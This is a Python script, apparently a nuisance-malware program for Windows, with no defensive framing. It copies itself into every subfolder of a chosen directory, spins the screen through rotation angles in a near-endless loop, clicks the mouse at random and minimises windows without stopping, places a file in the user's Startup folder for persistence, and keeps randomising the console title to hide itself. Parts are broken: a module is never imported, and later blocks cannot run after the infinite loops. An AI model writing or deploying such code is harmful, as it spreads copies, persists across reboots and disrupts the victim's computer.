import os, getpass, shutil, random, pyautogui as pyauto
import time
import rotatescreen as rs
from os import path
import ctypes

# Specify the base directory where the script will copy itself to
base_directory = "your/directory/path"

# Define the name for the copied script
copied_script_name = "copied_script.py"

# Function to copy the script to all folders within the specified directory
def copy_to_all_folders(base_dir, copied_script_name):
    for root, dirs, files in os.walk(base_dir):
        for dir in dirs:
            destination = os.path.join(root, dir, copied_script_name)
            shutil.copy(__file__, destination)
            print(f"Copy of script created: {destination}")

if __name__ == "__main__":
    copy_to_all_folders(base_directory, copied_script_name)
    
# Get the primary display for screen rotation
pd = rs.get_primary_display()

# List of angles for screen rotation
angle_list = [90, 180, 270, 0]

# Loop to rotate the screen continuously
for i in range(1,999999999999999999999999):
    for x in angle_list:
        pd.rotate_to(x)
        time.sleep(0.1)

# Loop to simulate random mouse clicks and minimize windows
while True:
    h = random.randint(0, 1080)
    w = random.randint(0, 1920)
    pyauto.click(h, w, duration = 0.3)
    pyauto.hotkey('winleft', 'm')

# Get the current user's name
USER_NAME = getpass.getuser()

# Specify the source path for the file to be moved
source_path = "hi.txt"

# Check if the source file exists
if path.exists(source_path):
    # Specify the destination path for moving the file to the Startup folder
    destination_path = "C://Users//%s//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup" % USER_NAME
    new_location = shutil.copy(source_path, destination_path)
    print("%s moved to the specified location: %s" % (source_path, new_location))
    print(destination_path)
else:
    print("File does not exist.")

# Constants for process information querying
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010

# Load the kernel32 DLL
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Function to generate a random name
def generate_random_name(length=8):
    characters = string.ascii_letters + string.digits
    random_name = ''.join(random.choice(characters) for _ in range(length))
    return random_name

# Function to set the process name
def set_process_name(new_name):
    kernel32.SetConsoleTitleW(new_name)

if __name__ == '__main__':
    try:
        # Infinite loop to set random process names
        while True:
            new_name = generate_random_name()
            set_process_name(new_name)
            print("New Process Name:", new_name)
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass
